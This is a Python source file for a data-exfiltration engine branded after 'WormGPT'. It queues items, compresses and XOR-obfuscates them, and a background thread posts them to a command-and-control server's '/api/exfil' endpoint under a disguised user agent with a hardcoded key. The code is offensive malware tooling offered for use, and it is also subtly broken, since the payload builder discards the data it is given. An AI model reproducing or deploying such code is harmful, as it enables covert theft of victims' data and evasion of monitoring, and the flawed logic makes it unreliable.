import time
import json
import base64
import gzip
import threading
import requests
from datetime import datetime
from queue import Queue

class ExfilEngine:
    def __init__(self, c2_url, encryption_key="wormgpt_key_2026"):
        self.c2_url = c2_url
        self.key = encryption_key
        self.session_id = "sess_" + str(int(time.time()))
        self.queue = Queue()
        self.active = True
        
        # Start the background transmission thread
        self.thread = threading.Thread(target=self._transmit_loop, daemon=True)
        self.thread.start()
        print(f"[*] Exfil Engine Initialized: Session {self.session_id}")

    def _xor_cipher(self, data):
        if isinstance(data, str):
            data = data.encode('utf-8')
        
        key_bytes = self.key.encode('utf-8')
        result = bytearray()
        for i, byte in enumerate(data):
            result.append(byte ^ key_bytes[i % len(key_bytes)])
        return bytes(result)

    # Add these methods to the ExfilEngine class

    def start(self):
        """Start the exfiltration engine"""
        if not self.active:
            self.active = True
            self.thread = threading.Thread(target=self._transmit_loop, daemon=True)
            self.thread.start()
            print(f"[*] Exfil Engine Started: Session {self.session_id}")
        return True

    def stop(self):
        """Stop the exfiltration engine"""
        if self.active:
            self.active = False
            self.thread.join(timeout=5)
            print(f"[*] Exfil Engine Stopped")
        return True

    @property
    def running(self):
        """Check if the exfiltration engine is running"""
        return self.active

    def _compress(self, data):
        if isinstance(data, str):
            data = data.encode('utf-8')
        return gzip.compress(data)

    def _encode(self, data):
        return base64.b64encode(data).decode('utf-8')

    def _create_payload(self, data_type, data_content):
        payload = {
            "session": self.session_id,
            "type": data_type,
            "timestamp": datetime.utcnow().isoformat() + "Z",
            "data": ""
        }
        
        json_str = json.dumps(payload)
        compressed = self._compress(json_str)
        obfuscated = self._xor_cipher(compressed)
        encoded = self._encode(obfuscated)
        
        payload['data'] = encoded
        return payload

    def exfiltrate(self, data_type, data_content):
        if not self.active:
            return
        
        payload = self._create_payload(data_type, data_content)
        self.queue.put(payload)

    def _transmit_loop(self):
        while self.active:
            try:
                payload = self.queue.get(timeout=1)
                self._send_to_c2(payload)
                self.queue.task_done()
            except:
                continue

    def _send_to_c2(self, payload):
        headers = {'Content-Type': 'application/json', 'User-Agent': 'WormGPT-Agent/1.0'}
        
        try:
            response = requests.post(
                self.c2_url + '/api/exfil', 
                data=json.dumps(payload), 
                headers=headers, 
                timeout=10
            )
            
            if response.status_code == 200:
                print(f"[+] Exfiltrated: {payload['type']} ({len(payload['data'])} bytes)")
            else:
                print(f"[-] Failed to exfil {payload['type']}. Status: {response.status_code}")
                
        except requests.exceptions.RequestException as e:
            print(f"[-] Network Error (Retrying later): {e}")

    def shutdown(self):
        self.active = False
        self.thread.join()

ExfiltrationEngine = ExfilEngine
